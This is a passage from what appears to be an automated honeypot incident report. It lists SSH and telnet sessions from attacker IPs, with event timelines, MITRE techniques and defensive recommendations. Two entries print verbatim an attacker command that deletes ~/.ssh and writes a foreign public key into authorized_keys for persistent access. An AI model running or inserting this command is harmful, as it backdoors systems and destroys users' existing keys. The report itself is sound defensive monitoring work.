- [ ] Submit `101.53.236[.]155` to AbuseIPDB if not already reported
- [ ] Block `101.53.236[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2e8e2f5c6fe

| Field | Detail |
|---|---|
| **Source IP** | `101.53.236[.]155` |
| **First Seen** | 2026-07-03 04:31 |
| **Last Seen** | 2026-07-03 04:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 04:31:31` | `cowrie.session.connect` |
| `2026-07-03 04:31:31` | `cowrie.client.version` |
| `2026-07-03 04:31:32` | `cowrie.client.kex` |
| `2026-07-03 04:31:32` | `cowrie.login.success` |
| `2026-07-03 04:31:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.53.236[.]155` to AbuseIPDB if not already reported
- [ ] Block `101.53.236[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45ed71cf0ab0

| Field | Detail |
|---|---|
| **Source IP** | `138.252.175[.]34` |
| **First Seen** | 2026-07-03 04:33 |
| **Last Seen** | 2026-07-03 04:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 04:33:11` | `cowrie.session.connect` |
| `2026-07-03 04:33:11` | `cowrie.client.version` |
| `2026-07-03 04:33:12` | `cowrie.client.kex` |
| `2026-07-03 04:33:13` | `cowrie.login.success` |
| `2026-07-03 04:33:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.252.175[.]34` to AbuseIPDB if not already reported
- [ ] Block `138.252.175[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a2575ec53df

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-03 04:33 |
| **Last Seen** | 2026-07-03 04:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 04:33:13` | `cowrie.session.connect` |
| `2026-07-03 04:33:13` | `cowrie.client.version` |
| `2026-07-03 04:33:13` | `cowrie.client.kex` |
| `2026-07-03 04:33:14` | `cowrie.login.success` |
| `2026-07-03 04:33:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd3ced8ea623

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-03 04:34 |
| **Last Seen** | 2026-07-03 04:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 04:34:28` | `cowrie.session.connect` |
| `2026-07-03 04:34:28` | `cowrie.client.version` |
| `2026-07-03 04:34:28` | `cowrie.client.kex` |
| `2026-07-03 04:34:28` | `cowrie.login.success` |
| `2026-07-03 04:34:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8d946c7d1ee

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-03 04:34 |
| **Last Seen** | 2026-07-03 04:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 04:34:28` | `cowrie.session.connect` |
| `2026-07-03 04:34:28` | `cowrie.client.version` |
| `2026-07-03 04:34:28` | `cowrie.client.kex` |
| `2026-07-03 04:34:28` | `cowrie.login.success` |
| `2026-07-03 04:34:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71f12874debf

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-03 04:34 |
| **Last Seen** | 2026-07-03 04:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 04:34:36` | `cowrie.session.connect` |
| `2026-07-03 04:34:36` | `cowrie.client.version` |
| `2026-07-03 04:34:36` | `cowrie.client.kex` |
| `2026-07-03 04:34:36` | `cowrie.login.success` |
| `2026-07-03 04:34:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66b920110ac7

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-03 04:34 |
| **Last Seen** | 2026-07-03 04:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 04:34:37` | `cowrie.session.connect` |
| `2026-07-03 04:34:37` | `cowrie.client.version` |
| `2026-07-03 04:34:37` | `cowrie.client.kex` |
| `2026-07-03 04:34:37` | `cowrie.login.success` |
| `2026-07-03 04:34:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6255021fc68b

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 04:35 |
| **Last Seen** | 2026-07-03 04:35 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 04:35:00` | `cowrie.session.connect` |
| `2026-07-03 04:35:01` | `cowrie.client.version` |
| `2026-07-03 04:35:01` | `cowrie.client.kex` |
| `2026-07-03 04:35:07` | `cowrie.login.success` |
| `2026-07-03 04:35:10` | `cowrie.session.params` |
| `2026-07-03 04:35:10` | `cowrie.command.input` |
| `2026-07-03 04:35:11` | `cowrie.log.closed` |
| `2026-07-03 04:35:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bb7cc713678

| Field | Detail |
|---|---|
| **Source IP** | `45.33.109[.]18` |
| **First Seen** | 2026-07-03 04:35 |
| **Last Seen** | 2026-07-03 04:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 04:35:03` | `cowrie.session.connect` |
| `2026-07-03 04:35:03` | `cowrie.login.success` |
| `2026-07-03 04:35:03` | `cowrie.session.params` |
| `2026-07-03 04:35:06` | `cowrie.log.closed` |
| `2026-07-03 04:35:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.109[.]18` to AbuseIPDB if not already reported
- [ ] Block `45.33.109[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a31769b24a06

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-03 04:40 |
| **Last Seen** | 2026-07-03 04:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 04:40:09` | `cowrie.session.connect` |
| `2026-07-03 04:40:09` | `cowrie.client.version` |
| `2026-07-03 04:40:09` | `cowrie.client.kex` |
| `2026-07-03 04:40:10` | `cowrie.login.success` |
| `2026-07-03 04:40:10` | `cowrie.session.params` |
| `2026-07-03 04:40:10` | `cowrie.command.input` |
| `2026-07-03 04:40:11` | `cowrie.log.closed` |
| `2026-07-03 04:40:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d83b2806b8c

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 04:46 |
| **Last Seen** | 2026-07-03 04:46 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 04:46:30` | `cowrie.session.connect` |
| `2026-07-03 04:46:31` | `cowrie.client.version` |
| `2026-07-03 04:46:31` | `cowrie.client.kex` |
| `2026-07-03 04:46:37` | `cowrie.login.success` |
| `2026-07-03 04:46:41` | `cowrie.session.params` |
| `2026-07-03 04:46:41` | `cowrie.command.input` |
| `2026-07-03 04:46:42` | `cowrie.log.closed` |
| `2026-07-03 04:46:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3ceb4c0a40e

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-03 04:47 |
| **Last Seen** | 2026-07-03 04:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 04:47:39` | `cowrie.session.connect` |
| `2026-07-03 04:47:39` | `cowrie.client.version` |
| `2026-07-03 04:47:39` | `cowrie.client.kex` |
| `2026-07-03 04:47:39` | `cowrie.login.success` |
| `2026-07-03 04:47:40` | `cowrie.direct-tcpip.request` |
| `2026-07-03 04:47:40` | `cowrie.direct-tcpip.data` |
| `2026-07-03 04:47:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9bfaec19dfe

| Field | Detail |
|---|---|
| **Source IP** | `138.252.175[.]34` |
| **First Seen** | 2026-07-03 04:50 |
| **Last Seen** | 2026-07-03 04:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 04:50:15` | `cowrie.session.connect` |
| `2026-07-03 04:50:15` | `cowrie.telnet.option` |
| `2026-07-03 04:50:16` | `cowrie.telnet.option` |
| `2026-07-03 04:51:16` | `cowrie.login.success` |
| `2026-07-03 04:51:16` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `138.252.175[.]34` to AbuseIPDB if not already reported
- [ ] Block `138.252.175[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6486ce72ffb

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 04:58 |
| **Last Seen** | 2026-07-03 04:58 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 04:58:01` | `cowrie.session.connect` |
| `2026-07-03 04:58:03` | `cowrie.client.version` |
| `2026-07-03 04:58:03` | `cowrie.client.kex` |
| `2026-07-03 04:58:09` | `cowrie.login.success` |
| `2026-07-03 04:58:12` | `cowrie.session.params` |
| `2026-07-03 04:58:12` | `cowrie.command.input` |
| `2026-07-03 04:58:14` | `cowrie.log.closed` |
| `2026-07-03 04:58:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d97232cd6724

| Field | Detail |
|---|---|
| **Source IP** | `122.35.192[.]33` |
| **First Seen** | 2026-07-03 05:06 |
| **Last Seen** | 2026-07-03 05:06 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 05:06:38` | `cowrie.session.connect` |
| `2026-07-03 05:06:38` | `cowrie.client.version` |
| `2026-07-03 05:06:38` | `cowrie.client.kex` |
| `2026-07-03 05:06:39` | `cowrie.login.success` |
| `2026-07-03 05:06:40` | `cowrie.session.params` |
| `2026-07-03 05:06:40` | `cowrie.command.input` |
| `2026-07-03 05:06:40` | `cowrie.command.failed` |
| `2026-07-03 05:06:40` | `cowrie.log.closed` |
| `2026-07-03 05:06:41` | `cowrie.session.params` |
| `2026-07-03 05:06:41` | `cowrie.command.input` |
| `2026-07-03 05:06:41` | `cowrie.session.file_download` |
| `2026-07-03 05:06:41` | `cowrie.log.closed` |
| `2026-07-03 05:06:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.35.192[.]33` to AbuseIPDB if not already reported
- [ ] Block `122.35.192[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-596a3cfd4e47

| Field | Detail |
|---|---|
| **Source IP** | `122.35.192[.]33` |
| **First Seen** | 2026-07-03 05:06 |
| **Last Seen** | 2026-07-03 05:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 05:06:41` | `cowrie.session.connect` |
| `2026-07-03 05:06:41` | `cowrie.client.version` |
| `2026-07-03 05:06:42` | `cowrie.client.kex` |
| `2026-07-03 05:06:43` | `cowrie.login.success` |
| `2026-07-03 05:06:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.35.192[.]33` to AbuseIPDB if not already reported
- [ ] Block `122.35.192[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c013149ca5e7

| Field | Detail |
|---|---|
| **Source IP** | `122.35.192[.]33` |
| **First Seen** | 2026-07-03 05:06 |
| **Last Seen** | 2026-07-03 05:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 05:06:43` | `cowrie.session.connect` |
| `2026-07-03 05:06:43` | `cowrie.client.version` |
| `2026-07-03 05:06:43` | `cowrie.client.kex` |
| `2026-07-03 05:06:44` | `cowrie.login.success` |
| `2026-07-03 05:06:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.35.192[.]33` to AbuseIPDB if not already reported
- [ ] Block `122.35.192[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b1bbeca8dfd

| Field | Detail |
|---|---|
| **Source IP** | `194.107.115[.]199` |
| **First Seen** | 2026-07-03 05:08 |
| **Last Seen** | 2026-07-03 05:13 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 05:08:45` | `cowrie.session.connect` |
| `2026-07-03 05:08:45` | `cowrie.client.version` |
| `2026-07-03 05:08:45` | `cowrie.client.kex` |
| `2026-07-03 05:08:46` | `cowrie.login.success` |
| `2026-07-03 05:13:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.107.115[.]199` to AbuseIPDB if not already reported
- [ ] Block `194.107.115[.]199` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a07295179570

| Field | Detail |
|---|---|
| **Source IP** | `194.107.115[.]199` |
| **First Seen** | 2026-07-03 05:09 |
| **Last Seen** | 2026-07-03 05:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 05:09:14` | `cowrie.session.connect` |
| `2026-07-03 05:09:14` | `cowrie.client.version` |
| `2026-07-03 05:09:14` | `cowrie.client.kex` |
| `2026-07-03 05:09:15` | `cowrie.login.success` |
| `2026-07-03 05:09:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.107.115[.]199` to AbuseIPDB if not already reported
- [ ] Block `194.107.115[.]199` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6c8d04914e0

| Field | Detail |
|---|---|
| **Source IP** | `194.107.115[.]199` |
| **First Seen** | 2026-07-03 05:09 |
| **Last Seen** | 2026-07-03 05:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 05:09:15` | `cowrie.session.connect` |
| `2026-07-03 05:09:15` | `cowrie.client.version` |
| `2026-07-03 05:09:16` | `cowrie.client.kex` |
| `2026-07-03 05:09:16` | `cowrie.login.success` |
| `2026-07-03 05:09:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.107.115[.]199` to AbuseIPDB if not already reported
- [ ] Block `194.107.115[.]199` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97ce60b4c633

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 05:09 |
| **Last Seen** | 2026-07-03 05:09 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 05:09:41` | `cowrie.session.connect` |
| `2026-07-03 05:09:43` | `cowrie.client.version` |
| `2026-07-03 05:09:43` | `cowrie.client.kex` |
| `2026-07-03 05:09:47` | `cowrie.login.success` |
| `2026-07-03 05:09:50` | `cowrie.session.params` |
| `2026-07-03 05:09:50` | `cowrie.command.input` |
| `2026-07-03 05:09:52` | `cowrie.log.closed` |
| `2026-07-03 05:09:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96bb2515ab87

| Field | Detail |
|---|---|
| **Source IP** | `220.154.143[.]136` |
| **First Seen** | 2026-07-03 05:12 |
| **Last Seen** | 2026-07-03 05:17 |
| **Session Duration** | 265s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 05:12:43` | `cowrie.session.connect` |
| `2026-07-03 05:12:43` | `cowrie.client.version` |
| `2026-07-03 05:12:43` | `cowrie.client.kex` |
| `2026-07-03 05:12:45` | `cowrie.login.success` |
| `2026-07-03 05:17:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.154.143[.]136` to AbuseIPDB if not already reported
- [ ] Block `220.154.143[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64139dcb7803

| Field | Detail |
|---|---|
| **Source IP** | `193.202.11[.]83` |
| **First Seen** | 2026-07-03 05:14 |
| **Last Seen** | 2026-07-03 05:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 05:14:01` | `cowrie.session.connect` |
| `2026-07-03 05:14:01` | `cowrie.client.version` |
| `2026-07-03 05:14:01` | `cowrie.client.kex` |
| `2026-07-03 05:14:01` | `cowrie.login.success` |
| `2026-07-03 05:14:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.202.11[.]83` to AbuseIPDB if not already reported
- [ ] Block `193.202.11[.]83` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e30ecdbe385f

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-03 05:14 |
| **Last Seen** | 2026-07-03 05:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 05:14:01` | `cowrie.session.connect` |
| `2026-07-03 05:14:01` | `cowrie.client.version` |
| `2026-07-03 05:14:01` | `cowrie.client.kex` |
| `2026-07-03 05:14:02` | `cowrie.login.success` |
| `2026-07-03 05:14:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ea4ad4ebce6

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-03 05:16 |
| **Last Seen** | 2026-07-03 05:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 05:16:41` | `cowrie.session.connect` |
| `2026-07-03 05:16:41` | `cowrie.client.version` |
| `2026-07-03 05:16:41` | `cowrie.client.kex` |
| `2026-07-03 05:16:41` | `cowrie.login.success` |
| `2026-07-03 05:16:42` | `cowrie.session.params` |
| `2026-07-03 05:16:42` | `cowrie.command.input` |
| `2026-07-03 05:16:42` | `cowrie.log.closed` |
| `2026-07-03 05:16:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbec7a741034

| Field | Detail |
|---|---|
| **Source IP** | `36.64.131[.]68` |
| **First Seen** | 2026-07-03 05:17 |
| **Last Seen** | 2026-07-03 05:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 05:17:16` | `cowrie.session.connect` |
| `2026-07-03 05:17:16` | `cowrie.client.version` |
| `2026-07-03 05:17:16` | `cowrie.client.kex` |
| `2026-07-03 05:17:17` | `cowrie.login.success` |
| `2026-07-03 05:17:18` | `cowrie.session.params` |
| `2026-07-03 05:17:18` | `cowrie.command.input` |
| `2026-07-03 05:17:18` | `cowrie.command.failed` |
| `2026-07-03 05:17:18` | `cowrie.log.closed` |
| `2026-07-03 05:17:20` | `cowrie.session.params` |
| `2026-07-03 05:17:20` | `cowrie.command.input` |
| `2026-07-03 05:17:20` | `cowrie.session.file_download` |
| `2026-07-03 05:17:20` | `cowrie.log.closed` |
| `2026-07-03 05:17:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.64.131[.]68` to AbuseIPDB if not already reported
- [ ] Block `36.64.131[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9c19b35c954

| Field | Detail |
|---|---|
| **Source IP** | `36.64.131[.]68` |
| **First Seen** | 2026-07-03 05:17 |
| **Last Seen** | 2026-07-03 05:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 05:17:20` | `cowrie.session.connect` |
| `2026-07-03 05:17:20` | `cowrie.client.version` |
| `2026-07-03 05:17:20` | `cowrie.client.kex` |
| `2026-07-03 05:17:22` | `cowrie.login.success` |
| `2026-07-03 05:17:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.64.131[.]68` to AbuseIPDB if not already reported
- [ ] Block `36.64.131[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

